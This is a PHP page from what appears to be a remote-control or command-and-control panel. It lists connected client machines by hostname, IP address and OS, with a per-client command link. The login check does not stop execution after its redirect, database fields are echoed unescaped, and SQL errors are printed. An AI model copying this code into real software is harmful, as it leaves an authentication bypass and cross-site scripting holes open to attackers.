<?php
include("includes/connect.php");

if (!isset($_SESSION['username'])){
    header('Location: index.php?page=login');
}

$sql = "SELECT * FROM clients";
$query = mysqli_query($connect, $sql);

if($query){

    $row_count = mysqli_num_rows($query);

    if($row_count > 0){

        echo "<div align='center'>";
        echo "<center><h2>Connected clients</h2></center>";
        echo "<table class='clients'>";
        echo "<thead>";
        echo "<th>ID</th><th>Computer Name</th><th>IP Address</th><th>OS</th><th>Online</th><th>Operations</th>";
        echo "</thead>";
        while($row = mysqli_fetch_array($query)){
            
            $clientid = $row['clientid'];
            $hostname = $row['hostname'];
            $ip = $row['ipaddress'];
            $os = $row['os'];
            $online = $row['online'];
            # $command = $row['command'];
            
            echo "<tr>";
            echo "<td>".$clientid."</td>";
            echo "<td>".$hostname."</td>";
            echo "<td>".$ip."</td>";
            echo "<td>".$os."</td>";
            echo "<td>".$online."</td>";
            echo "<td><a href='index.php?page=command&cmd=SndMsg&id=".$clientid."'>Send Message</a></td>";
            echo "</tr>";
        }        

        echo "</table>";
    } else {
        echo "<center><h2>No connected clients, yet</h2></center>";
    }
} else {
    $err = mysqli_error();
    die("<br/>{$sql}<br/>*** $err ***<br/>");
}


?>